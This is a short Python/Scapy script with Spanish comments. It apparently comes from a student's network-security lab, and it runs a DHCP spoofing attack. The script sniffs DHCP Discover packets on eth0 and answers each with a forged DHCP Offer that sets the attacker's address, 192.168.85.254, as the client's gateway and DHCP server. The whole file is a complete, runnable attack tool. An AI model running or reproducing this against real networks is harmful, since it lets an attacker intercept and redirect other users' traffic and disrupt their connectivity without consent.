from scapy.all import *

def jonath_dhcp_spoof(interfaz):
    """
    Función principal del ataque DHCP Spoofing.
    Escucha solicitudes DHCP Discover y responde
    con ofertas falsas antes que el servidor legítimo.
    """
    print("=" * 50)
    print("  DHCP Spoofing - Jonathan Sención 20250851")
    print("=" * 50)
    print(f"[*] Interfaz objetivo: {interfaz}")
    print("[*] Esperando solicitudes DHCP Discover...")
    print("[*] Presiona Ctrl+C para detener\n")
    
    def jonath_handle_dhcp(pkt):
        # Verificamos si es un DHCP Discover
        if DHCP in pkt and pkt[DHCP].options[0][1] == 1:
            mac_cliente = pkt[Ether].src
            print(f"[*] DHCP Discover recibido de: {mac_cliente}")
            
            # Construimos el DHCP Offer falso
            oferta_falsa = (Ether(dst=mac_cliente) /
                           IP(src="192.168.85.254", dst="255.255.255.255") /
                           UDP(sport=67, dport=68) /
                           BOOTP(op=2,
                                 yiaddr="192.168.85.100",
                                 siaddr="192.168.85.254",
                                 chaddr=pkt[Ether].src) /
                           DHCP(options=[
                               ("message-type", "offer"),
                               ("server_id", "192.168.85.254"),
                               ("lease_time", 3600),
                               ("subnet_mask", "255.255.255.0"),
                               ("router", "192.168.85.254"),
                               ("name_server", "8.8.8.8"),
                               "end"
                           ]))
            
            # Enviamos la oferta falsa al cliente
            sendp(oferta_falsa, iface=interfaz, verbose=False)
            print(f"[*] DHCP Offer falso enviado a: {mac_cliente}")
            print(f"    IP ofrecida:  192.168.85.100")
            print(f"    Gateway falso: 192.168.85.254\n")
    
    # Escuchamos paquetes DHCP en la red
    sniff(filter="udp and (port 67 or port 68)",
          prn=jonath_handle_dhcp,
          iface=interfaz,
          store=0)

# Punto de entrada del script
jonath_dhcp_spoof("eth0")
